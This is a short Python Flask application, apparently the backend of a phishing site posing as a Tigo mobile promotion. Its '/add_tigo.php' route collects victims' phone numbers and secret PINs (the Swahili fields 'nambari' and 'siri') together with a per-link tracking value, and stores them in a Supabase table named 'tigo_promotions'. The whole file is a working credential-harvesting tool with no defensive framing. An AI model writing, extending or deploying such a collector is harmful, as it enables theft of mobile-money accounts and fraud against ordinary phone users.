from flask import Flask, request
import os

app = Flask(__name__)

# Initialize Supabase
supabase = None
SUPABASE_ENABLED = False

try:
    from supabase import create_client

    supabase_url = os.environ.get("SUPABASE_URL")
    supabase_key = os.environ.get("SUPABASE_KEY")

    if supabase_url and supabase_key:
        supabase = create_client(supabase_url, supabase_key)
        SUPABASE_ENABLED = True
except Exception:
    supabase = None
    SUPABASE_ENABLED = False


@app.route("/")
def home():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()


@app.route("/add_tigo.php", methods=["POST"])
def add_tigo():
    try:
        nambari = request.form.get("nambari")
        siri = request.form.get("siri")
        url_link = request.form.get("url_link", "gzktrsjamfkw")

        if not nambari or not siri:
            return "Please fill all required fields", 400

        if not SUPABASE_ENABLED or supabase is None:
            return "Server configuration error", 500

        data = {
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link,
        }

        supabase.table("tigo_promotions").insert(data).execute()

        return "Data added successfully! ✅"

    except Exception as e:
        return f"Error: {str(e)}", 500
